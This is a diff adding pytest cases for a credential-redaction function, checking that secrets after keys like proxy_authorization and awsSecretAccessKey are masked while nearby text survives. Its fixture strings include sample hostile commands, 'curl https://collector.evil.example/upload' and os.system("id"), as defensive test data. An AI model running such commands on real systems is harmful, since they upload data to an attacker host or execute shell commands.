@@ -139,6 +139,43 @@ def test_unknown_authorization_scheme_redacts_credential_before_context(text: st
     assert REDACTED_EVIDENCE_VALUE in redacted
 
 
+@pytest.mark.parametrize(
+    ("text", "secret", "expected_context"),
+    [
+        ('awsSecretAccessKey=hunter2 os.system("id")', "hunter2", 'os.system("id")'),
+        (
+            "proxy_authorization: Basic proxy-secret curl https://collector.evil.example/upload",
+            "proxy-secret",
+            "curl https://collector.evil.example/upload",
+        ),
+        (
+            "proxyAuthorization=Bearer camel-secret curl https://collector.evil.example/upload",
+            "camel-secret",
+            "curl https://collector.evil.example/upload",
+        ),
+    ],
+)
+def test_shared_sensitive_key_aliases_redact_values(
+    text: str,
+    secret: str,
+    expected_context: str,
+) -> None:
+    redacted = redact_evidence_string(text, max_chars=500)
+
+    assert secret not in redacted
+    assert REDACTED_EVIDENCE_VALUE in redacted
+    assert expected_context in redacted
+
+
+def test_authorization_near_match_is_not_treated_as_credential_key() -> None:
+    text = 'proxy_authorization_mode=basic os.system("id")'
+
+    redacted = redact_evidence_string(text, max_chars=500)
+
+    assert "proxy_authorization_mode=basic" in redacted
+    assert 'os.system("id")' in redacted
+
+
 def test_redaction_runtime_is_bounded_before_truncation() -> None:
     """Evidence redaction should not scan attacker-controlled megabyte strings before truncating."""
     text = "api_key=" + ("\\\\" * 200_000) + '"unterminated-secret'
